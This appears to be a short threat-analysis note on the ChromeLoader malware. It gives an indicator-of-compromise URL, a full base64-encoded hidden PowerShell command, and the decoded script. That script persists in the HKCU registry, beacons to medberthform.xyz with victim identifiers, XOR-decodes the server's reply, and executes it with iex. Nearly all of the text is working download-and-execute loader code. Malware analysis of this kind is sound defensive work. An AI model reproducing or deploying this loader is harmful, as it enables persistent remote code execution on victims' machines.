Malware Type: ChromeLoader

IOCS:
hxxps://medberthform[.]xyz/x?u=####&is=####&lv=##&rv=##


PowerShell Launching Chrome

Malicious PowerShell:
powershell -WindowStyle Hidden -E "CgAKACQAagBfAFYAYQByAD0AJABuAHUAbABsADsACgAkAG8AawA9ACQAdAByAHUAZQAKAAoACgAkAHIATABEAF8AdgAgAD0AIAAiADIAOQAiADsACgAkAFYAUgBQAGEAcgAgAD0AIAAiAFcAeQBJAHoATgB6AFUAdwBOAGoAVQAzAE8ARABVADUATQBqAFUAMQBPAFQATQB4AE4ARABBAGkATABEAEUAMgBOAGoAQQAyAE4AegBJAHkATQBUAFkAcwBJAGkASgBkACIAOwAKAAoAJABhAHMAYwBFAG4AQwBfAHMAdAByAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJADsACgAKAGYAdQBuAGMAdABpAG8AbgAgAHIAZQBjAHYASQB0AGUAbQBCAHkASQBkAHgAKABbAHMAdAByAGkAbgBnAF0AJABCAHQAcwBBADIAKQAgAHsACgAJACQAQgB0AHMAQQA9AFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAEIAdABzAEEAMgApADsACgAKAAkAJABzAHQAPQAkAGEAcwBjAEUAbgBDAF8AcwB0AHIALgBHAGUAdABCAHkAdABlAHMAKAAnAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACcAKQA7AAoACQAkAGUAZAA9ACQAQgB0AHMAQQBbADAALgAuADQAXQA7AAoACgAJACQAaQA9ADAAOwAKAAkAJABsAD0AJABlAGQALgBMAGUAbgBnAHQAaAA7AAoACQAkAGsAPQBAACgAKQA7AAoACgAJAFsAYQByAHIAYQB5AF0AOgA6AFIAZQBzAGkAegBlACgAWwByAGUAZgBdACQAawAsACQAcwB0AC4AbABlAG4AZwB0AGgAKQA7AAoACQBmAG8AcgBlAGEAYwBoACgAJABiACAAaQBuACAAJABzAHQAKQAgAHsAJABrAFsAJABpACsAKwBdAD0AJABiACAALQBiAHgAbwByACAAJABlAGQAWwAkAGkAJQAkAGwAXQB9AAoACgAJACQAYgBzAD0AJABCAHQAcwBBAFsANQAuAC4AJABCAHQAcwBBAC4AbABlAG4AZwB0AGgAXQA7AAoACgAJACQAaQA9ADAAOwAKAAkAJABsAD0AJABrAC4ATABlAG4AZwB0AGgAOwAKAAkAJABkAHQAPQBAACgAKQA7AAoACgAJAFsAYQByAHIAYQB5AF0AOgA6AFIAZQBzAGkAegBlACgAWwByAGUAZgBdACQAZAB0ACwAJABiAHMALgBsAGUAbgBnAHQAaAApADsACgAJAGYAbwByAGUAYQBjAGgAKAAkAGIAIABpAG4AIAAkAGIAcwApACAAewAkAGQAdABbACQAaQArACsAXQA9ACQAYgAgAC0AYgB4AG8AcgAgACQAawBbACQAaQAlACQAbABdAH0ACgAKAAkAcgBlAHQAdQByAG4AIAAkAGEAcwBjAEUAbgBDAF8AcwB0AHIALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZAB0ACkAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgA7AAoAfQAKAAoAJAB1AHQAaQBsAHMAIAA9ACAAIgBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAcgBhAGcAZQAgAFUAdABpAGwAaQB0AGkAZQBzAFwAIgA7AAoACgB0AHIAeQAgAHsACgAKAAkAJABqAF8AVgBhAHIAPQAkAGEAcwBjAEUAbgBDAF8AcwB0AHIALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAFYAUgBQAGEAcgApACkAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgA7AAoAfQAgAGMAYQB0AGMAaAB7AH0ACgAKACQAdgAgAD0AIAAiADAAIgA7AAoAJABwAHIAbwB0AEwAaQBjACAAPQAgACIATABpAGMAZQBuAGMAZQAgAFAAcgBvAHQAZQBjAHQAbwByACIAOwAKACQAZAAgAD0AIAAiAG0AZQBkAGIAZQByAHQAaABmAG8AcgBtAC4AeAB5AHoAIgA7AAoACgAKACQAZABpAD0AJABqAF8AVgBhAHIAWwAyAF0AOwAKACQAYQAgAD0AIAAkAGEAcwBjAEUAbgBDAF8AcwB0AHIAOwAKACQAaQBzAD0AJABqAF8AVgBhAHIAWwAxAF0AOwAKAAoAJABkAGEAdAAgAD0AIAAkAG4AdQBsAGwAOwAKACQAdQA9ACQAagBfAFYAYQByAFsAMABdADsACgAKAHcAaABpAGwAZQAoACQAbwBrACkAIAB7AAoACQB0AHIAeQB7AAoACQAJAHQAcgB5AHsACgAJAAkACQBpAGYAIAAoACEAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAdQB0AGkAbABzACkAKQB7AE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAdQB0AGkAbABzACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AH0ACgAJAAkAfQAKAAkACQBjAGEAdABjAGgAewB9AAoACgAJAAkAJABjAHIAIAA9ACAAJABmAGEAbABzAGUAOwAKAAkACQBpAGYAIAAoACQAZABhAHQAIAAtAGUAcQAgACQAbgB1AGwAbAApACAAewAKAAkACQAJAHQAcgB5ACAAewAKAAkACQAJAAkAJAByACAAPQAgAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACAALQBQAGEAdABoACAAJAB1AHQAaQBsAHMAIAAtAE4AYQBtAGUAIAAkAHAAcgBvAHQATABpAGMAOwAKAAkACQAJAAkAJABkAGEAdAAgAD0AIAByAGUAYwB2AEkAdABlAG0AQgB5AEkAZAB4ACgAJAByACkAOwAKAAkACQAJAAkAJAB2ACAAPQAgACQAZABhAHQAWwAwAF0AOwAKAAkACQAJAAkAJABjAHIAIAA9ACAAJAB0AHIAdQBlADsACgAJAAkACQB9AGMAYQB0AGMAaAB7AH0ACgAJAAkAfQAgAGUAbABzAGUAIAB7AAoACQAJAAkAJAB2ACAAPQAgACQAZABhAHQAWwAwAF0AOwAKAAkACQB9AAoACgAJAAkAdAByAHkAIAB7AAoACQAJAAkAJABmAG0AdAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwB7ADAAfQAvAHgAPwB1AD0AewAxAH0AJgBpAHMAPQB7ADIAfQAmAGwAdgA9AHsAMwB9ACYAcgB2AD0AewA0AH0AIgAgAC0AZgAgACQAZAAsACQAdQAsACQAaQBzACwAJAByAEwARABfAHYALAAkAHYACgAJAAkACQAkAGQAdAAgAD0AIAB3AGcAZQB0ACAAJABmAG0AdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAOwAKAAoACQAJAAkAJABkAGEAdAAyACAAPQAgAHIAZQBjAHYASQB0AGUAbQBCAHkASQBkAHgAKAAkAGQAdAApADsACgAJAAkACQBpAGYAIAAoACQAZABhAHQAMgBbADAAXQAgAC0AZwB0ACAAJAB2ACkAIAB7AAoACQAJAAkACQAkAHYAMgAgAD0AIAAkAGQAYQB0ADIAWwAwAF0AOwAKAAoACQAJAAkACQBOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJAB1AHQAaQBsAHMAIAAtAE4AYQBtAGUAIAAkAHAAcgBvAHQATABpAGMAIAAtAFYAYQBsAHUAZQAgACQAZAB0ACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgACIAUwB0AHIAaQBuAGcAIgAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AAoACQAJAAkACQAkAGQAYQB0ACAAPQAgACQAZABhAHQAMgA7AAoACQAJAAkACQAkAGMAcgAgAD0AIAAkAHQAcgB1AGUAOwAKAAkACQAJAH0ACgAJAAkAfQBjAGEAdABjAGgAewB9AAoACgAJAAkAaQBmACAAKAAkAGMAcgAgAC0AZQBxACAAJAB0AHIAdQBlACkAIAB7AAoACQAJAAkAdAByAHkAewAKAAkACQAJAAkAcwB0AG8AcAA7AAoACQAJAAkAfQBjAGEAdABjAGgAewB9AAoACQAJAAkAdAByAHkAIAB7AGkAZQB4ACAAJABkAGEAdABbADEAXQA7AH0AYwBhAHQAYwBoAHsAfQAKAAkACQB9AAoACQB9ACAAYwBhAHQAYwBoAHsAfQAKAAoACQB0AHIAeQAgAHsACgAJAAkAJABtAHgAcwAgAD0AIAAoACgAZwBlAHQALQByAGEAbgBkAG8AbQAgADgAMAAgAC0AbQBpAG4AaQBtAHUAbQAgADUANQApACoANgAwACkAOwAKAAkACQAkAGMAZAB0ACAAPQAgAFsAaQBuAHQAXQAoAEcAZQB0AC0ARABhAHQAZQAgAC0AVQBGAG8AcgBtAGEAdAAgACUAcwApADsACgAKAAkACQA6AGMAbgB0ACAAdwBoAGkAbABlACgAJABvAGsAKQAgAHsACgAJAAkACQB0AHIAeQB7AHQAZQBtAHAAKAAkAGQALAAkAHUALAAkAGkAcwAsACQAZABpACkAOwB9AGMAYQB0AGMAaAB7AH0ACgAKAAkACQAJAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgACgAZwBlAHQALQByAGEAbgBkAG8AbQAgADcANQAgAC0AbQBpAG4AaQBtAHUAbQAgADMANQApADsACgAJAAkACQAkAG4AZAB0ACAAPQAgAFsAaQBuAHQAXQAoAEcAZQB0AC0ARABhAHQAZQAgAC0AVQBGAG8AcgBtAGEAdAAgACUAcwApADsACgAKAAkACQAJAGkAZgAgACgAKAAkAG4AZAB0AC0AJABjAGQAdAApACAALQBnAHQAIAAkAG0AeABzACkAIAB7AAoACQAJAAkACQBiAHIAZQBhAGsAIABjAG4AdAA7AAoACQAJAAkAfQAKAAkACQB9AAoACgAJAH0AIABjAGEAdABjAGgAewB9AAoAfQAKAAoA"


Decoded PowerShell:


$j_Var=$null;
$ok=$true


$rLD_v = "29";
$VRPar = "WyIzNzUwNjU3ODU5MjU1OTMxNDAiLDE2NjA2NzIyMTYsIiJd";

$ascEnC_str=[System.Text.Encoding]::ASCII;

function recvItemByIdx([string]$BtsA2) {
	$BtsA=[System.Convert]::FromBase64String($BtsA2);

	$st=$ascEnC_str.GetBytes('Get-ItemPropertyValue');
	$ed=$BtsA[0..4];

	$i=0;
	$l=$ed.Length;
	$k=@();

	[array]::Resize([ref]$k,$st.length);
	foreach($b in $st) {$k[$i++]=$b -bxor $ed[$i%$l]}

	$bs=$BtsA[5..$BtsA.length];

	$i=0;
	$l=$k.Length;
	$dt=@();

	[array]::Resize([ref]$dt,$bs.length);
	foreach($b in $bs) {$dt[$i++]=$b -bxor $k[$i%$l]}

	return $ascEnC_str.GetString($dt) | ConvertFrom-Json;
}

$utils = "HKCU:\Software\Mirage Utilities\";

try {

	$j_Var=$ascEnC_str.GetString([System.Convert]::FromBase64String($VRPar)) | ConvertFrom-Json;
} catch{}

$v = "0";
$protLic = "Licence Protector";
$d = "medberthform.xyz";


$di=$j_Var[2];
$a = $ascEnC_str;
$is=$j_Var[1];

$dat = $null;
$u=$j_Var[0];

while($ok) {
	try{
		try{
			if (!(Test-Path $utils)){New-Item -Path $utils | Out-Null;}
		}
		catch{}

		$cr = $false;
		if ($dat -eq $null) {
			try {
				$r = Get-ItemPropertyValue -Path $utils -Name $protLic;
				$dat = recvItemByIdx($r);
				$v = $dat[0];
				$cr = $true;
			}catch{}
		} else {
			$v = $dat[0];
		}

		try {
			$fmt = "https://{0}/x?u={1}&is={2}&lv={3}&rv={4}" -f $d,$u,$is,$rLD_v,$v
            echo $fmt
			$dt = wget $fmt -UseBasicParsing;

			$dat2 = recvItemByIdx($dt);
			if ($dat2[0] -gt $v) {
				$v2 = $dat2[0];

				New-ItemProperty -Path $utils -Name $protLic -Value $dt -PropertyType "String" -Force | Out-Null;
				$dat = $dat2;
				$cr = $true;
			}
		}catch{}

		if ($cr -eq $true) {
			try{
				stop;
			}catch{}
			try {iex $dat[1];}catch{}
		}
	} catch{}

	try {
		$mxs = ((get-random 80 -minimum 55)*60);
		$cdt = [int](Get-Date -UFormat %s);

		:cnt while($ok) {
			try{temp($d,$u,$is,$di);}catch{}

			Start-Sleep (get-random 75 -minimum 35);
			$ndt = [int](Get-Date -UFormat %s);

			if (($ndt-$cdt) -gt $mxs) {
				break cnt;
			}
		}

	} catch{}
}

